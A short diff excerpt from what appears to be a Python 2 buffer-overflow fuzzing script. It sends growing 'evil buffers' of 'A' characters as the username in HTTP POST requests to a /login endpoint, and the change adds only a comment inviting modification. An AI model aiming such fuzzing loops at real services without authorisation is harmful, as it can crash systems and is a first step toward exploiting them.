@@ -11,6 +11,8 @@ while(size < 2000):
     try:
         print "\n Sending evil buffer %s bytes" % size
         inputBuffer = "A" * size
+        
+        #modify this to suit your needs
 
         content = "username=" + inputBuffer +"&password=A"
         buffer = "POST /login HTTP/1.1\r\n"
